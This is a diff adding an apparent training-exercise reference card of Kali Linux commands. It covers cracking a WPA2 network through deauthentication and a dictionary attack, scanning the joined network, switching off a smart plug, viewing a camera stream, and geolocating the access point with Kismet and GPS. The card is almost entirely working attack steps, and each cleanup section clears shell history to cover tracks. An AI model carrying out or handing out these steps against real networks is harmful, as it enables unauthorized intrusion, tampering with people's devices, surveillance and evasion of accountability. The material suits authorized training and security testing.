@@ -1,0 +1,156 @@
+FTX — Operator Reference Card
+Equipment: Kali Linux, Alfa Network Adapter, GPS USB Receiver
+Note: Some commands require sudo. Run a collection terminal and a command terminal side by side.
+
+AUTHORIZED USE ONLY: For use exclusively in authorized training environments and FTX scenarios
+where explicit written permission has been granted by the network owner. Use against any system
+without authorization is illegal under 18 U.S.C. § 1030 (CFAA), the UK Computer Misuse Act 1990,
+EU Directive 2013/40/EU, and equivalent laws worldwide. By accessing this material you agree to
+the full terms in the LICENSE file, including warranty disclaimer and limitation of liability.
+Licensed under CC BY-NC-ND 4.0 — https://creativecommons.org/licenses/by-nc-nd/4.0/
+
+================================================================
+EXERCISE 1 — WIFI EXPLOITATION
+================================================================
+
+--- Prepare Interface ---
+Confirm Alfa adapter is visible:
+  iwconfig
+
+Randomize MAC (OPSEC — prevents Alfa OUI from appearing in AP logs):
+  sudo macchanger -r wlan1
+  Ref: https://github.com/alobbs/macchanger
+
+Kill interfering processes, then enable monitor mode:
+  airmon-ng check kill
+  airmon-ng start wlan1
+  iwconfig    <- confirm wlan1mon is listed
+  Ref: https://www.aircrack-ng.org/doku.php?id=airmon-ng
+
+--- Scan and Target ---
+Initial scan (all channels — record BSSID and channel of target):
+  airodump-ng wlan1mon
+  Output columns: BSSID | PWR (dBm) | CH | ENC | CIPHER | AUTH | ESSID
+  Example: <TARGET_BSSID>  -46  ch <CHANNEL>  WPA2 CCMP PSK  <TARGET_SSID>
+  Ref: https://www.aircrack-ng.org/doku.php?id=airodump-ng
+
+Lock to target channel and BSSID (prevents channel hopping, filters noise):
+  airodump-ng wlan1mon -c <CHANNEL> --bssid <TARGET_BSSID>
+
+--- Capture Handshake ---
+Start capture to file (COLLECTION terminal):
+  airodump-ng wlan1mon -c <CHANNEL> --bssid <TARGET_BSSID> --write <CAPTURE_FILE>
+  Note: writes <CAPTURE_FILE>-01.cap — contains the WPA2 4-way EAPOL handshake
+  Ref: https://www.aircrack-ng.org/doku.php?id=cracking_wpa
+
+Force handshake by deauthenticating clients (COMMAND terminal):
+  aireplay-ng --deauth 100 -a <TARGET_BSSID> wlan1mon
+  Note: 802.11 deauth frames are unauthenticated by design — no credentials needed to send
+  Confirm: collection window shows [ WPA handshake: <TARGET_BSSID> ] in top-right corner
+  Ref: https://www.aircrack-ng.org/doku.php?id=aireplay-ng
+
+--- Crack Password ---
+Run dictionary attack against captured handshake:
+  aircrack-ng <CAPTURE_FILE>-01.cap -w /usr/share/wordlists/rockyou.txt
+  Note: if rockyou.txt is missing, run: sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+  Note: offline operation — tests PBKDF2/HMAC-SHA1 for each candidate word
+  Result: KEY FOUND! [ <PASSWORD> ]
+  GPU alternative: hashcat mode 22000 — significantly faster
+  Ref: https://www.aircrack-ng.org/doku.php?id=aircrack-ng
+  Ref: https://hashcat.net/wiki/doku.php?id=hashcat
+
+--- Authenticate and Enumerate ---
+Disable built-in NIC (never connect target network through it — attribution risk):
+  sudo ip link set wlan0 down
+Connect Alfa to target network using cracked password.
+If Alfa is still in monitor mode, unplug and replug to reset to managed mode.
+  ip addr show wlan1    <- confirm DHCP lease on wlan1 (e.g. <YOUR_IP>)
+
+ICMP ping sweep (fast, may miss hosts with ICMP blocked):
+  for i in {1..254}; do ping -c 1 <SUBNET_PREFIX>.$i | grep "from"; done
+
+nmap sweep (ARP-based, finds hosts that block ICMP):
+  nmap -sP <SUBNET>/24 -oA pingsweep
+  Expected: <GATEWAY_IP> (router), <PLUG_IP> (TP-Link), <CAMERA_IP> (camera)
+  Ref: https://nmap.org/book/man-host-discovery.html
+
+Service scan each host:
+  nmap -Pn -n -sT -sV <GATEWAY_IP>  -oA scan_router    <- ports 53, 80
+  nmap -Pn -n -sT -sV <PLUG_IP>     -oA scan_tplink    <- port 9999 (Kasa protocol)
+  nmap -Pn -n -sT -sV <CAMERA_IP>   -oA scan_camera    <- ports 80, 443, 554 (RTSP), 49152 (UPnP)
+  Ref: https://nmap.org/book/man-port-scanning-techniques.html
+
+--- Execute Effects ---
+TP-Link smart plug — unauthenticated JSON API on port 9999:
+  python3 tplink_smartplug.py -t <PLUG_IP> -c info    <- verify target device
+  python3 tplink_smartplug.py -t <PLUG_IP> -c off     <- cut power
+  python3 tplink_smartplug.py -t <PLUG_IP> -c on      <- restore power
+  Ref: https://github.com/softScheck/tplink-smartplug
+  Protocol ref: https://www.softscheck.com/en/reverse-engineering-tp-link-hs110/
+
+D-Link camera — RTSP stream on port 554:
+  Browser: http://<CAMERA_IP>  -> Status page -> confirm correct camera -> screenshot
+  VLC stream: vlc rtsp://<CAMERA_IP>/
+  Ref: https://datatracker.ietf.org/doc/html/rfc2326
+
+--- Clean Up ---
+  rm <CAPTURE_FILE>-01.cap pingsweep.* scan_router.* scan_tplink.* scan_camera.*
+  echo -n > ~/.zsh_history && exec zsh
+  Settings Manager -> Advanced Network Configurations -> remove target WiFi network
+
+
+================================================================
+EXERCISE 2 — GPS GEOLOCATION WITH KISMET
+================================================================
+
+--- Verify Hardware ---
+Re-enable monitor mode (required after Exercise 1 cleanup):
+  airmon-ng start wlan1
+  iwconfig    <- confirm wlan1mon is listed
+
+Start gpsd (required before cgps will show data):
+  sudo gpsd /dev/ttyUSB0 -F /var/run/gpsd.sock
+  Note: if gpsd is already running this will error — that's fine, proceed
+
+Confirm GPS receiver and signal:
+  ls /dev/ttyUSB0          <- if missing, check dmesg | tail for alternate path
+  cgps -s                  <- wait for 3D FIX (>=4 satellites) before collecting
+  airodump-ng wlan1mon     <- confirm target BSSID is still in range
+  Ref: https://gpsd.gitlab.io/gpsd/
+
+--- Run Kismet ---
+Start Kismet (passive — transmits no frames, undetectable):
+  sudo kismet
+  Right-click http://localhost:2501 in terminal to open web UI
+  Ref: https://www.kismetwireless.net/docs/readme/quickstart/
+  GPS ref: https://www.kismetwireless.net/docs/readme/gps/
+
+Configure in web UI:
+  Hamburger menu (top left) -> Enable Datasource -> wlan1mon -> All Channels
+  Confirm GPS coordinate values are updating in top-right
+  Wait until target BSSID appears in Devices tab
+  Ctrl+C to stop (graceful shutdown required — flush writes to .kismet SQLite DB)
+  Note: killing the process without Ctrl+C can corrupt the .kismet file
+  Ref: https://www.kismetwireless.net/docs/readme/datasources/
+
+--- Convert and Visualize ---
+Convert .kismet database to KML:
+  sudo kismetdb_to_kml --in Kismet-<TIMESTAMP>.kismet --out OUTPUT.kml
+  Note: filename format is Kismet-YYYYMMDD-HH-MM-SS-N.kismet
+  Ref: https://www.kismetwireless.net/docs/readme/kismetdb/kismetdb_to_kml/
+  KML ref: https://developers.google.com/kml/documentation/kmlreference
+
+Open in Google Earth:
+  File -> Open -> All Files -> select OUTPUT.kml
+  Search for <TARGET_BSSID> in left panel
+  Right-click placemark -> Properties -> change symbol -> Save
+  Record coordinates:
+    Lat/Long  : visible under Properties
+    MGRS      : Tools (top banner) -> Military Grid System -> Properties
+  Note: MGRS format example — 38SMB4611052890 (zone / 100km square / easting / northing)
+  MGRS ref: https://www.nga.mil/ProductsServices/GeodesyandGeophysics/GeodeticTranslator.html
+
+--- Clean Up ---
+  rm *.kismet OUTPUT.kml
+  echo -n > ~/.zsh_history && exec zsh
+  Settings Manager -> Advanced Network Configurations -> remove target WiFi network
